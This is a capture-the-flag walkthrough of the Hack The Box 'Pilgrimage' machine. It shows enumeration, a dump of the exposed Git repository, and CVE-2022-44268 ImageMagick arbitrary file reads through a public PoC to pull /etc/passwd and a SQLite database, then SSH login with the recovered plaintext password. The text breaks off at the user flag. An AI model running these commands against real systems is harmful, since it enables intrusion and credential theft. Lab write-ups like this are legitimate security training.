# HTB_Pilgrimage

## Synopsis
Pilgrimage is an easy-difficulty Linux machine featuring a web application with an exposed Git repository.  
Analysing the underlying filesystem and source code reveals the use of a vulnerable version of ImageMagick,  
which can be used to read arbitrary files on the target by embedding a malicious tEXT chunk into a PNG image.  
The vulnerability is leveraged to obtain a SQLite database file containing a plaintext password that can be  
used to SSH into the machine. Enumeration of the running processes reveals a Bash script executed by root  
that calls a vulnerable version of the Binwalk binary. By creating another malicious PNG, CVE-2022-4510 is  
leveraged to obtain Remote Code Execution (RCE) as root.

---

## Skills Required
- Basics of Web enumeration  
- Basics of Linux enumeration  

## Skills Learned
- Rudimentary source code review  
- Basic scripting  
- Structure of PNG files  

---

## Enumeration

### Nmap
An initial Nmap scan reveals SSH and Nginx services running on their respective default ports.  
The domain `pilgrimage.htb` is revealed, which we add to our hosts file.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.219 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.219
pgsql
Copy
Edit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Feroxbuster
We run a feroxbuster scan to enumerate potentially exposed directories and endpoints.

bash
Copy
Edit
feroxbuster --url http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
makefile
Copy
Edit
Found: 
http://pilgrimage.htb/.git/
http://pilgrimage.htb/.git/logs/
http://pilgrimage.htb/assets/
http://pilgrimage.htb/assets/css/
http://pilgrimage.htb/assets/images/
http://pilgrimage.htb/assets/js/
http://pilgrimage.htb/tmp/
http://pilgrimage.htb/vendor/
http://pilgrimage.htb/vendor/jquery/
Git Dumper
The scan reveals an exposed .git directory. We use git-dumper to dump and recreate the repository.

bash
Copy
Edit
git-dumper http://pilgrimage.htb/ ./pilgrimage_source
less
Copy
Edit
[+] Fetching http://pilgrimage.htb/.git/objects/...
[+] Running git checkout .
Foothold
The repository contains a custom ImageMagick binary:

bash
Copy
Edit
./magick --version
makefile
Copy
Edit
Version: ImageMagick 7.1.0-49 beta
This version is vulnerable to CVE-2022-44268 (Arbitrary File Read via PNG tEXt chunk).

We use the following PoC:

bash
Copy
Edit
git clone https://github.com/voidz0r/CVE-2022-44268.git
cd CVE-2022-44268
cargo run "/etc/passwd"
Identifying the Malicious PNG
bash
Copy
Edit
identify -verbose image.png
vbnet
Copy
Edit
png:text: 1 tEXt/zTXt/iTXt chunks were found
profile: /etc/passwd
After uploading the image and retrieving the modified version:

bash
Copy
Edit
identify -verbose 64f59dc103cbb.png
bash
Copy
Edit
Raw profile type:
726f6f743a783a30...
Extracting Data with Python
We decode the hex-encoded data from the image:

bash
Copy
Edit
python3 -c 'print(bytes.fromhex("726f6f743a783a30..."))'
ruby
Copy
Edit
root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:emily:/home/emily:/bin/bash
...
SQLite DB Extraction
From the downloaded repo we find:

php
Copy
Edit
$db = new PDO('sqlite:/var/db/pilgrimage');
We exploit again, this time targeting the SQLite DB path:

bash
Copy
Edit
cargo run "/var/db/pilgrimage"
Convert the hex data into an SQLite file:

python
Copy
Edit
with open("hex", "rb") as f:
    data = bytes.fromhex(f.read().decode())
with open("sql.db", "wb") as f:
    f.write(data)
Verify it's a valid DB:

bash
Copy
Edit
file sql.db
pgsql
Copy
Edit
sql.db: SQLite 3.x database
Accessing Credentials
bash
Copy
Edit
sqlite3 sql.db
sql
Copy
Edit
.tables
images  users

SELECT * FROM users;
Copy
Edit
emily|abigchonkyboi123
SSH Access
bash
Copy
Edit
ssh emily@pilgrimage.htb
ruby
Copy
Edit
Linux pilgrimage 5.10.0-23-amd64

emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
User flag can be found in /home/emily/user.txt
